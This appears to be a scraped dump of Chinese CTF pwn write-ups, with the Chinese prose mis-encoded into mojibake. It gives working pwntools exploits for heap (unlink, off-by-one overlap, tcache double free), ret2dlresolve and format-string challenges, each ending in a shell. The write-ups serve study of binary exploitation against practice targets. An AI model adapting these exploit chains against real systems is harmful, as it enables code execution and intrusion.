0x602140 libc = ELF(libc_path) e = ELF('./stkof') # ç¨‹åºåœ¨è°ƒç”¨fgetså’Œprintfä¹‹å‰æ²¡ç”¨æ‰§è¡Œsetbufæ“ä½œï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡è°ƒç”¨fgetså’Œprintfçš„æ—¶å€™ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä¼šç”³è¯·chunkã€‚ # å¯¼è‡´ç¬¬ä¸€ä¸ªç”³è¯·çš„å †å—ä¸å…¶å®ƒå †å—ä¸è¿ç»­ã€‚ add(0x1000) # idx 1 # ç”³è¯·3ä¸ªè¿ç»­çš„å †å— add(0x90) # idx 2 add(0x80) # idx 3 add(0x10) # idx 4 # é€šè¿‡å †æº¢å‡ºæ”¹å†™chunk3çš„prev_inuseä½ï¼Œå¹¶ä¸”æ„é€ fake chunk # fake chunkçš„fd-\u003ebkå’Œbk-\u003efdæŒ‡å‘s[2] payload1 = b'a'*8 + p64(0x91) payload1 += p64(s_addr-8) + p64(s_addr) payload1 = payload1.ljust(0x90, b'a') payload1 += p64(0x90) + p64(0x90) edit(2, len(payload1), payload1) # free chunk3ï¼Œè§¦å‘å¯¹äºchun2çš„unlinkæ“ä½œï¼Œæ”¹å†™s[2]å†…å®¹ä¸º\u0026s[2]-0x18 delete(3) # ä¿®æ”¹sæ•°ç»„å†…å®¹ payload2 = b'a'*8 payload2 += p64(e.got['strlen']) # s[0] payload2 += p64(e.got['free']) # s[1] edit(2, len(payload2), payload2) # ä¿®æ”¹strlen@gotä¸ºputs@plt edit(0, 8, p64(e.plt['puts'])) # æ³„éœ²free@gotå†…å®¹ show(1) # è®¡ç®—libcåŸºå€ free_address = u64(p.recvuntil(b'\\x7f')[-6:]+b'\\x00'*2) libc_base = free_address - libc.sym['free'] system_addr = libc_base + libc.sym['system'] # ä¿®æ”¹free@got edit(1, 8, p64(system_addr)) # å†™å…¥ \"/bin/sh\"ï¼Œæ‰§è¡Œsystem(\"/bin/sh\") edit(4, 8, b'/bin/sh\\x00') delete(4) p.interactive() ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["CTF","pwn","å †"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆä¸‰ï¼‰ï¼šå †å­¦ä¹ ","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x02-hitcon2014_stkof"},{"categories":["CTF"],"content":"0x03 npuctf_2020_easyheap é¢˜ç›®é“¾æ¥ libc version: Ubuntu GLIBC 2.27-3ubuntu1 2.27ï¼Œoff-by-oneå¯¼è‡´å †å—é‡å ã€‚freeä¹‹åå†åˆ†é…å¯ä»¥ä½¿å¾—åˆ†é…çš„å †å—é‡å ï¼Œä»è€Œé€ æˆè¦†ç›–æŒ‡é’ˆã€‚æ¥ç€å°±æ˜¯æ³„éœ²libcï¼‹æ”¹gotè¡¨ã€‚ from pwn import * context(log_level = \"debug\") context(os=\"linux\", arch=\"amd64\") if args.REMOTE: p = remote('node4.buuoj.cn', 29292) else: context.terminal = [\"tmux\",\"splitw\",\"-h\"] p = process('./npuctf_2020_easyheap') gdb.attach(p) def create(size: int, content: bytes): assert size == 0x18 or size == 0x38, \"wrong size\" p.sendlineafter(b'Your choice :', b'1') p.sendlineafter(b'Size of Heap(0x10 or 0x20 only) :', str(size).encode()) p.sendafter(b'Content:', content) def edit(index: int, content: bytes): p.sendlineafter(b'Your choice :', b'2') p.sendlineafter(b'Index :', str(index).encode()) p.sendafter(b'Content: ', content) def show(index: int): p.sendlineafter(b'Your choice :', b'3') p.sendlineafter(b'Index :', str(index).encode()) def delete(index: int): p.sendlineafter(b'Your choice :', b'4') p.sendlineafter(b'Index :', str(index).encode()) e = ELF('./npuctf_2020_easyheap') libc = ELF('./libc6_2.27-3ubuntu1_amd64.so') # ä¸‹é¢è¿™ä¸ªglibc-all-in-oneçš„libc2.27ä¸å¯¹ï¼Œå¯èƒ½æ˜¯ç‰ˆæœ¬é«˜äº†ä¸€ç‚¹ã€‚ # libc = ELF('/home/leo/tools/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so') # print(hex(libc.sym['free'])) # é€šè¿‡è¦†ç›–sizeåŸŸæ¥å®ç°å †å—é‡å ï¼Œå†deleteï¼Œç„¶åmalloc(0x38)å’Œmalloc(0x10)å°±ä¼šé€ æˆæ•°æ®å †å—ä¸ç®¡ç†å †å—é‡å ã€‚ # æ¥ç€å°±å¯ä»¥æ§åˆ¶ç®¡ç†å †å—ä¸Šè®°å½•çš„æŒ‡é’ˆï¼Œå®ç°gotè¡¨åœ°å€çš„è¯»å–ä¸ä¿®æ”¹ create(0x18, b'/bin/sh\\x00') # id0 create(0x18, b'a'*8) # id1 # overlap chunk edit(0, b'/bin/sh\\x00'+b'a'*0x10 + b'\\x41') # chunkè¢«æ”¾å…¥tcache binæ—¶ï¼Œç³»ç»Ÿä¸ä¼šå°†å…¶ä¸‹ä¸€ä¸ªchunkçš„prev_inuseæ¸…0ï¼Œæ‰€ä»¥è¿™é‡Œä¸ç”¨æ‹…å¿ƒæœ€åçš„chunkè¢«freeä¹‹åä¸top chunkåˆå¹¶ delete(1) create(0x38, b'c'*8) # id1 edit(1, b'c'*0x18 + p64(0x21) + p64(0x38) + p64(e.got['free'])) # leak libc show(1) free_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\00')) libc_base = free_addr - libc.sym['free'] p.success(hex(libc_base)) system_addr = libc_base + libc.sym['system'] # modify free@got edit(1, p64(system_addr)) delete(0) p.interactive() ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:4:0","series":null,"tags":["CTF","pwn","å †"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆä¸‰ï¼‰ï¼šå †å­¦ä¹ ","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x03-npuctf_2020_easyheap"},{"categories":["CTF"],"content":"0x04 ciscn_2019_final_3 é¢˜ç›®é“¾æ¥ libc version: Ubuntu GLIBC 2.27-3ubuntu1 æ–°ç±»å‹ï¼Œä¹‹å‰æ²¡åšè¿‡ã€‚ 2.27çš„tcache binåœ¨ç¨‹åºæœªç½®é›¶freeä¹‹åçš„æŒ‡é’ˆæ—¶æ˜¯å¯ä»¥double freeçš„ï¼Œ2.28æ‰åŠ å…¥äº†keyæ¥é˜²æ­¢double freeã€‚è€Œdouble freeå¯ä»¥é€ æˆtcache dupï¼Œæ¥ç€å¯ä»¥ä»»æ„åœ°å€mallocã€‚ è¿™é¢˜å°±æ˜¯åˆ©ç”¨è¯¥æ“ä½œï¼Œé€šè¿‡ä»»æ„åœ°å€mallocæ”¹å†™chunkçš„sizeï¼Œä½¿å…¶freeçš„æ—¶å€™è¿›å…¥åˆ°unsorted binï¼Œç„¶åæ³„éœ²libcã€‚æ¥ç€æ”¹å†™malloc_hookä¸ºone gadgetã€‚ from pwn import * ''' â¯ one_gadget ./libc.so.6 0x4f2c5 execve(\"/bin/sh\", rsp+0x40, environ) constraints: rsp \u0026 0xf == 0 rcx == NULL 0x4f322 execve(\"/bin/sh\", rsp+0x40, environ) constraints: [rsp+0x40] == NULL 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL ''' context(os = \"linux\", arch = \"amd64\") context(log_level = \"debug\") libc = ELF('./libc.so.6') if args.REMOTE: p = remote('node4.buuoj.cn', 27792) else: context.terminal = [\"tmux\", \"splitw\", \"-h\"] p = process('./ciscn_final_3', env={'LD_PERLOAD': './libc.so.6'}) gdb.attach(p) def add(index: int, size: int, content: bytes): p.sendlineafter(b'choice \u003e ', b'1') p.sendlineafter(b'index\\n', str(index).encode()) p.sendlineafter(b'size\\n', str(size).encode()) p.sendlineafter(b'something\\n', content) p.recvuntil(b'gift :') return int(p.recv(14).decode(), 16) def remove(index: int): p.sendlineafter(b'choice \u003e ', b'2') p.sendlineafter(b'index\\n', str(index).encode()) heap = add(0, 0x78, b'a') #0 # p.info(\"heap: \"+hex(heap)) add(1, 0x18, b'b') #1 add(2, 0x78, b'c') #2 add(3, 0x78, b'd') #3 add(4, 0x78, b'c') #4 add(5, 0x78, b'd') #5 add(6, 0x78, b'c') #6 add(7, 0x78, b'd') #7 add(8, 0x78, b'c') #8 # ======= 0x421 chunk to here ======== add(9, 0x78, b'd') #9 add(10, 0x78, b'c') #10 add(11, 0x78, b'd') #11 add(12, 0x28, b'd') #12 # double free, create tcache dup remove(12) remove(12) add(13, 0x28, p64(heap-0x10)) # tcache bin won't check the size of the chunk. so we don't have to find the '0x7f' or other value in memory add(14, 0x28, p64(heap-0x10)) # make overlap, modify the size of chunk 0 to 0x420 add(15, 0x28, p64(0) + p64(0x421)) remove(0) # send chunk 0 to unsorted bin remove(1) # send chunk 1 to tcache bin add(16, 0x78, b'a') # move main_arena pointer to chunk 1 add(17, 0x18, b'a') main_arena = add(18, 0x18, b'a') - 0x60 malloc_hook = main_arena - 0x10 libc_base = malloc_hook - libc.sym['__malloc_hook'] one_gadget = libc_base + 0x10a38c # 0x4f322 ä¸è¡Œ p.success(\"got libc base: \"+hex(libc_base)) p.success(\"cal onegadget: \"+hex(one_gadget)) # dup again remove(5) remove(5) add(19, 0x78, p64(malloc_hook)) add(20, 0x78, p64(malloc_hook)) add(21, 0x78, p64(one_gadget)) # trigger malloc \u0026 get shell p.sendlineafter(b'choice \u003e ', b'1') p.sendlineafter(b'index\\n', b'22') p.sendlineafter(b'size\\n', b'0') p.interactive() ","date":"2021-09-06","objectID":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/:5:0","series":null,"tags":["CTF","pwn","å †"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆä¸‰ï¼‰ï¼šå †å­¦ä¹ ","uri":"/2021-09-06-buuctf%E5%A0%86%E7%9B%B8%E5%85%B3%E8%AE%B0%E5%BD%95/#0x04-ciscn_2019_final_3"},{"categories":["CTF"],"content":"èŠ±äº†ä¸€ä¸ªä¸Šåˆæ—¶é—´ï¼Œçœ‹äº†ä¸€ä¸‹ret2dlresolveçš„åŸºæœ¬åŸç†ä¸åŸºæœ¬çš„åˆ©ç”¨è¿‡ç¨‹ã€‚è§‰å¾—æ­¥éª¤ä¸ç›¸å…³ç»†èŠ‚è¦ç´ è¿˜æ˜¯è›®å¤šçš„ï¼Œä¸ºé˜²æ­¢ä»ŠåæŸä¸€å¤©å†ç”¨åˆ°çš„æ—¶å€™å¿˜å¾—å¹²å¹²å‡€å‡€ï¼Œç‰¹æ­¤è®°å½•ä¸€äº›æˆ‘ä¸ªäººçš„ç†è§£ï¼ŒåŠ æ·±å°è±¡ã€‚ ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["CTF","pwn","æ ˆ"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆäºŒï¼‰ï¼šret2dlresolveå­¦ä¹ è®°å½•","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#"},{"categories":["CTF"],"content":"0x00 dlresolveåŸç† ä»¥ä¸‹å†…å®¹æ˜¯32ä½x86å¹³å°ç›¸å…³ï¼Œ64ä½çš„ret2dlresolveæˆ‘è¿˜æ²¡çœ‹ã€‚ è¿™ä¸€éƒ¨åˆ†å†…å®¹éœ€è¦è®°ä½çš„å°±æ˜¯ç¬¦å·è§£æçš„è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯dlresolveæ‰§è¡Œçš„è¿‡ç¨‹ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ret2dlresolveç”Ÿæ•ˆçš„æ ¸å¿ƒåŸç†ã€‚ åœ¨ç¬¦å·è§£æè¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸‰ç§æ•°æ®ç»“æ„ï¼šELF32_Relã€ELF32_symã€.dynsträ¸­çš„å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«ä½äº.rel.pltã€.dynsymã€.dynstrèŠ‚ï¼ˆsectionï¼‰ï¼ŒæŸ¥çœ‹è¿™äº›èŠ‚çš„å‘½ä»¤ä¸º readelf -S elf_name åœ¨ç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨æŸä¸ªå‡½æ•°æ—¶ï¼Œå…³äºpltå¤„æŒ‡ä»¤ä»¥åŠpushæ“ä½œä»€ä¹ˆçš„å°±ä¸ç»†è¯´äº†ï¼Œæˆ‘è®¤ä¸ºæ•´ä¸ªæµç¨‹å¤§è‡´å¯ä»¥è¿™ä¹ˆç†è§£ï¼š func@pltå¤„çš„æŒ‡ä»¤ç›¸å½“äºå…ˆpushä¸€ä¸ªoffsetå€¼ï¼Œç„¶åè°ƒç”¨plt[0]å¤„çš„æŒ‡ä»¤ï¼Œè¿™æ¡æŒ‡ä»¤ç›¸å½“äºæ‰§è¡Œ_dl_runtime_resolve(link_map_obj, reloc_index)ï¼Œè¿™é‡Œçš„reloc_indexå°±æ˜¯å‰é¢func@pltpushçš„offset æ¥ä¸‹æ¥å°±æ˜¯ä¸‰æ­¥èµ°äº†ï¼Œä»å‡½æ•°åŸå‹_dl_runtime_resolve(link_map_obj, reloc_index)å‡ºå‘ï¼Œæ ¹æ®reloc_indexï¼ˆç›¸å¯¹äº.rel.pltçš„å­—èŠ‚åç§»é‡ï¼Œå•ä½ï¼šå­—èŠ‚ï¼‰æ‰¾åˆ°.rel.pltä¸­çš„ELF32_Relå¯¹è±¡ï¼ˆå¤§å°ä¸º8å­—èŠ‚ï¼‰ï¼Œå…¶ä¸­è®°å½•äº†ä¸€ä¸ªr_info å†æ ¹æ®r_infoï¼ˆç›¸å¯¹äº.dynsymçš„ç´¢å¼•ï¼Œå•ä½ï¼š0x10å­—èŠ‚ï¼‰æ‰¾åˆ°.dynsymä¸­çš„ELF32_symç±»å‹å¯¹è±¡ï¼ˆå¤§å°ä¸º0x10å­—èŠ‚ï¼‰ å†æ ¹æ®ELF32_symä¸­çš„st_nameå­—æ®µï¼ˆç›¸å¯¹äº.synstrçš„å­—èŠ‚åç§»é‡ï¼Œå•ä½ï¼šå­—èŠ‚ï¼‰ï¼Œæ‰¾åˆ°.dynsträ¸­çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯å‡½æ•°åï¼ˆæ­£å¸¸æ‰§è¡Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼‰ï¼Œç„¶ådlresolveä»libcä¸­æŸ¥æ‰¾ï¼Œå†è®¡ç®—å®é™…åœ°å€ï¼Œå°†å…¶å¡«å…¥ELF32_Relå¯¹è±¡ä¸­çš„r_offsetå­—æ®µâ€¦ æ•´ä¸ªæµç¨‹æ¦‚æ‹¬èµ·æ¥å°±æ˜¯ï¼Œfunc@pltç»™_dl_runtime_resolveä¼ å‚æ•°ï¼Œ_dl_runtime_resolveæ ¹æ®å…¶å‚æ•°å»æŸ¥è¯¢ä¸Šé¢çš„é‚£å‡ ä¸ªè¡¨è·å–å‡½æ•°åç§°ï¼Œç„¶åå¯¹libcè¿›è¡Œè§£æï¼Œè·å–å®é™…åœ°å€ï¼Œå†™å…¥gotè¡¨ã€‚ ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:1:0","series":null,"tags":["CTF","pwn","æ ˆ"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆäºŒï¼‰ï¼šret2dlresolveå­¦ä¹ è®°å½•","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#0x00-dlresolveåŸç†"},{"categories":["CTF"],"content":"0x01 æ”»å‡»æ–¹æ³• æ„Ÿè§‰å¾ˆå¤šé¢˜éƒ½å¯ä»¥æ ˆè¿ç§»ï¼Œå†åŠ ä¸Šå¦‚æœ.bssæ®µå¯å†™çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶å°†å‡½æ•°æ ˆè¿ç§»åˆ°è‡ªå·±æ„é€ çš„æ ˆä¸Šã€‚ äºæ˜¯ï¼Œæœ€å¸¸è§„çš„æ”»å‡»æ­¥éª¤å°±æ˜¯ï¼š æ ˆè¿ç§»ï¼Œç„¶åè°ƒç”¨plt[0]å¤„æŒ‡ä»¤ æ§åˆ¶æ ˆä¸Šçš„å‚æ•°ï¼ˆå¯¹äº_dl_runtime_resolveè€Œè¨€ï¼‰ï¼Œä»¥åŠæƒ³è¦è°ƒç”¨çš„å‡½æ•°çš„å‚æ•°ï¼ˆæ¯”å¦‚systemï¼‰ å†åœ¨æ ˆä¸Šæ„é€ å¯¹åº”è¯¥å‚æ•°çš„ELF32_Relç±»å‹å¯¹è±¡ å†åœ¨æ ˆä¸Šæ„é€ å¯¹åº”ELF32_Relä¸­r_infoçš„ELF32_symç±»å‹å¯¹è±¡ å†åœ¨æ ˆä¸Šæ„é€ å¯¹åº”äºELF32_symä¸­st_nameçš„å­—ç¬¦ä¸² æ‰€ä»¥ä¸€ä¸ªå…¸å‹çš„expä¸ºï¼š from pwn import * elf = ELF('./parelro_x86') offset = 112 read_plt = elf.plt['read'] ppp_ret = 0x08048619 # ROPgadget --binary bof --only \"pop|ret\" pop_ebp_ret = 0x0804861b # ROPgadget --binary parelro_x86 | grep 'pop ebp ; ret' leave_ret = 0x08048458 # ROPgadget --binary bof --only \"leave|ret\" stack_size = 0x800 bss_addr = 0x0804a040 # readelf -S bof | grep \".bss\" plt_0 = 0x08048380 # objdump -d -j .plt bof æ‰§è¡Œ \u003cpush link_mapï¼Œjmp dl_resolve\u003e rel_plt = 0x08048330 # objdump -s -j .rel.plt bof # æ ˆè¿ç§»çš„ç›®çš„åœ° base_stage = bss_addr + stack_size index_offset = (base_stage + 28) - rel_plt # base_stage + 28æŒ‡å‘fake_relocï¼Œå‡å»rel_pltå³åç§» write_got = elf.got['write'] dynsym = 0x080481d8 dynstr = 0x08048278 # fake_sym_addr åœ°å€æŒ‰ç…§0x10å­—èŠ‚å¯¹é½ fake_sym_addr = base_stage + 36 align = 0x10 - ((fake_sym_addr - dynsym) \u0026 0xf) # è¿™é‡Œçš„å¯¹é½æ“ä½œæ˜¯å› ä¸ºdynsymé‡Œçš„Elf32_Symç»“æ„ä½“éƒ½æ˜¯0x10å­—èŠ‚å¤§å° fake_sym_addr = fake_sym_addr + align index_dynsym = (fake_sym_addr - dynsym) // 0x10 # é™¤ä»¥0x10å› ä¸ºElf32_Symç»“æ„ä½“çš„å¤§å°ä¸º0x10ï¼Œå¾—åˆ°writeçš„dynsymç´¢å¼•å· r_info = (index_dynsym \u003c\u003c 8) | 0x7 # è¦æ»¡è¶³ï¼šELFW(R_TYPE)(reloc-\u003er_info) == ELF_MACHINE_JMP_SLOTï¼Œå³æœ€ä½å­—èŠ‚è¦ä¸º7 fake_reloc = p32(write_got) + p32(r_info) st_name = (fake_sym_addr + 0x10) - dynstr # åŠ 0x10å› ä¸ºElf32_Symçš„å¤§å°ä¸º0x10 fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12) r = process('./parelro_x86') r.recvuntil('Welcome to XDCTF2015~!\\n') payload = b'A' * offset payload += p32(read_plt) # è¯»100ä¸ªå­—èŠ‚åˆ°base_stage payload += p32(ppp_ret) payload += p32(0) payload += p32(base_stage) payload += p32(100) payload += p32(pop_ebp_ret) # æŠŠbase_stage popåˆ°ebpä¸­ payload += p32(base_stage) payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;å°†espæŒ‡å‘base_stage r.sendline(payload) cmd = b\"/bin/sh\" # stage3: # æ ˆè¿ç§»ï¼Œè°ƒplt[0]ï¼Œä¼ å…¥ä¼ªé€ çš„ index_offsetï¼ŒæŒ‡å‘æˆ‘ä»¬è‡ªå®šä¹‰çš„.rel.pltè¡¨é¡¹å†…å®¹ # å¹¶ä¸”æ§åˆ¶r_infoï¼ŒæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„.dynsymè¡¨é¡¹ï¼›å†æ§åˆ¶.dynsymè¡¨é¡¹ä¸­çš„st_nameï¼ŒæŒ‡å‘æˆ‘ä»¬æ§åˆ¶çš„.dynstrè¡¨é¡¹å†…å®¹ # --------\u003e base_stage payload2 = b'AAAA' payload2 += p32(plt_0) payload2 += p32(index_offset) payload2 += b'AAAA' payload2 += p32(base_stage + 80) # å¯¹åº”system('/bin/sh') payload2 += p32(0xdeadbeef) # åé¢çš„2ä¸ªå‚æ•°ä¸éœ€è¦äº† payload2 += p32(0xdeadbeef) # (base_stage+28)çš„ä½ç½® payload2 += fake_reloc # (base_stage+36)çš„ä½ç½® payload2 += b'B' * align # (fake_sym_addr)çš„ä½ç½® payload2 += fake_sym payload2 += b\"system\\x00\" payload2 += b'A' * (80 - len(payload2)) # base_stage + 80 payload2 += cmd + b'\\x00' payload2 += b'A' * (100 - len(payload2)) # payload2ç»“æŸï¼Œåˆšå¥½100å­—èŠ‚ r.sendline(payload2) r.interactive() å†™ä¸€éä¸‹æ¥ï¼Œæ„Ÿè§‰åœ¨æ²¡æœ‰å®Œå®Œå…¨å…¨å¼„é€å½»çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡æ–‡å­—æè¿°æ¸…æ™°è¿˜æ˜¯æ¯”è¾ƒéš¾çš„ï¼Œä½†ä¹Ÿåªèƒ½å…ˆè¿™æ ·äº†ğŸ˜¶ ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:0","series":null,"tags":["CTF","pwn","æ ˆ"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆäºŒï¼‰ï¼šret2dlresolveå­¦ä¹ è®°å½•","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#0x01-æ”»å‡»æ–¹æ³•"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ï¼š ã€Šctfç«èµ›æƒå¨æŒ‡å—(pwnç¯‡)ã€‹â€“$10.6:ret2dl-resolve Return-to-dl-resolve ï¼ˆå¤ç°å¹³å°ï¼šubuntu16ï¼‰ CTF Wiki: ret2dlresolve [åŸåˆ›]é«˜çº§æ ˆæº¢å‡ºä¹‹ret2dlresolveè¯¦è§£(x86\u0026x64)ï¼Œé™„æºç åˆ†æ ï¼ˆå’Œä¸Šä¸¤ç¯‡åšæ–‡å·®ä¸å¤šï¼Œä½†æ˜¯_dl_runtime_resolve()çš„æ‰§è¡Œè¿‡ç¨‹å†™å¾—å¾ˆæ¸…æ™°ï¼Œç»™ä½œè€…ç‚¹ä¸ªèµï¼‰ ","date":"2021-09-02","objectID":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","series":null,"tags":["CTF","pwn","æ ˆ"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆäºŒï¼‰ï¼šret2dlresolveå­¦ä¹ è®°å½•","uri":"/2021-09-02-ret2dlresolve%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#å‚è€ƒé“¾æ¥"},{"categories":["CTF"],"content":" é¢˜ç›®é“¾æ¥ checksec ç»“æœ Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) IDAåˆ†æ IDAimage-20210828140628177 \" IDA å¾ˆæ˜æ˜¾ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚é€šè¿‡x==4çš„åˆ¤æ–­å°±èƒ½å¤Ÿæ‹¿åˆ°shellï¼Œé‚£åº”è¯¥å°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è¦†ç›–æŒ‡å®šåœ°å€å†…å®¹ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç±»å‹çš„pwnï¼Œæ ¸å¿ƒå°±åœ¨äºç¡®å®šæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚å› ä¸ºä¸€èˆ¬æ¥è¯´åœ¨è°ƒç”¨printf(buf)çš„æ—¶å€™ï¼Œæ ˆå¸ƒå±€æ˜¯è¿™æ ·çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—é€šè¿‡gdbè°ƒè¯•ç­‰æ‰‹æ®µæ¥åˆ¤æ–­æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€çš„åç§»ã€‚ .... low ----------------- ----------------- old ebp -----------------stack of printf() ret addr ---------------- --------- arg1: addr of fmt_str | ----------------- | offset | | addr----------------- --------- format string content ........ high----------------- .... æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯è¾“å…¥aaaa/aaaaaaaaï¼‹%p.%p.....ï¼Œé€šè¿‡çœ‹0x61åœ¨å“ªå¼€å§‹å‡ºç°æ¥åˆ¤æ–­åç§»ã€‚ å½“ç„¶ï¼Œåœ¨è°ƒè¯•çš„æ—¶å€™ä¹Ÿèƒ½å¤Ÿé€šè¿‡è®¡ç®—å¾—å‡ºåç§»ï¼Œå¦‚æœ¬é¢˜çš„åç§»å°±ä¸º(0x9c-0x70)/4=11ï¼ˆå› ä¸ºæ˜¯32ä½ï¼Œå­—é•¿ä½4å­—èŠ‚ï¼‰ã€‚ å†ç»“åˆIDAæŸ¥æ‰¾å˜é‡xçš„åœ°å€ï¼Œå°±å¯ä»¥å†™expäº†ã€‚ from pwn import * context.os = \"linux\" context.arch = \"i386\" # context.log_level = \"debug\" if args.LOCAL: p = process(\"./fm\") else: p = remote(\"node4.buuoj.cn\", 28965) x_addr = 0x804a02c format_str_offset = 11 payload = p32(x_addr)+b'%11$n' p.sendline(payload) p.interactive() ","date":"2021-08-27","objectID":"/2021-08-27-buuctf-pwn-fmtstr/:0:0","series":null,"tags":["CTF","pwn","fmt_str"],"title":"pwnåˆå­¦è€…çš„è¿›é˜¶ï¼ˆä¸€ï¼‰ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²","uri":"/2021-08-27-buuctf-pwn-fmtstr/#"},{"categories":["ç¯å¢ƒé…ç½®ç³»åˆ—"],"content":"è®°å½•ä¸€ä¸‹wslè¿ç§»ä»¥åŠè‡ªé€‰å®‰è£…ä½ç½®çš„ä¸€äº›æ“ä½œã€‚ æ‰“åŒ… wsl --export distro_name file_name.tar åˆ é™¤ wsl --unregister distro_name å¯¼å…¥ï¼ˆæœ‰çœ‹åˆ°åšå®¢è¯´è¿™é‡Œçš„distro_nameéœ€è¦ä¸åŸæœ¬çš„disrto_nameä¸€è‡´ï¼Œä¸ç„¶ä¼šå‡ºé—®é¢˜ï¼Œä½†æˆ‘æ²¡è¯•è¿‡ã€‚ï¼‰ wsl --import distro_name install_location file_name.tar è®¾ç½®ç”¨æˆ·ä¸ºåŸå…ˆçš„é»˜è®¤ç”¨æˆ· ubuntu2004 config --default-user \u003cyour_user_name\u003e wslæ‰‹åŠ¨å®‰è£…å³å¯è‡ªå·±é€‰æ‹©å®‰è£…ä½ç½®ï¼Œåœ¨å®˜ç½‘ä¸‹è½½ç›¸åº”çš„å‘è¡Œç‰ˆï¼Œç„¶åå°†.appxåç¼€åæ”¹ä¸º.zipï¼Œè§£å‹åˆ°è‡ªå®šä¹‰çš„ç›®å½•ï¼Œç‚¹å‡»exeå®‰è£…å³å¯ã€‚ ","date":"2021-08-27","objectID":"/2021-08-27-wsl%E8%BF%81%E7%A7%BB%E7%AD%89%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/:0:0","series":null,"tags":["WSL"],"title":"Wslè¿ç§»ç­‰æ“ä½œè®°å½•","uri":"/2021-08-27-wsl%E8%BF%81%E7%A7%BB%E7%AD%89%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/#"},{"categories":["CTF"],"content":"0x00 å‰è¨€ å†™è¿™é“é¢˜ä¹‹å‰, å¤§å®¶é¦–å…ˆè¦äº†è§£, æƒ³è¦è·å¾—ä¸€ä¸ªshell, é™¤äº†system(\"/bin/sh\") ä»¥å¤–, è¿˜æœ‰ä¸€ç§æ›´å¥½çš„æ–¹æ³•, å°±æ˜¯ç³»ç»Ÿè°ƒç”¨ä¸­çš„ execve(\"/bin/sh\", NULL, NULL)è·å¾—shellã€‚æˆ‘ä»¬å¯ä»¥åœ¨ Linxuç³»ç»Ÿè°ƒç”¨å·è¡¨ä¸­æ‰¾åˆ°å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·,è¿›è¡Œè°ƒç”¨, å…¶ä¸­32ä½ç¨‹åºç³»ç»Ÿè°ƒç”¨å·ç”¨ eax å‚¨å­˜, ç¬¬ä¸€ ã€ äºŒ ã€ ä¸‰å‚æ•°åˆ†åˆ«åœ¨ ebx ã€ecx ã€edxä¸­å‚¨å­˜ï¼Œ å¯ä»¥ç”¨ int 80æ±‡ç¼–æŒ‡ä»¤è°ƒç”¨ã€‚64ä½ç¨‹åºç³»ç»Ÿè°ƒç”¨å·ç”¨ rax å‚¨å­˜, ç¬¬ä¸€ ã€ äºŒ ã€ ä¸‰å‚æ•°åˆ†åˆ«åœ¨ rdi ã€rsi ã€rdxä¸­å‚¨å­˜ï¼Œ å¯ä»¥ç”¨syscall 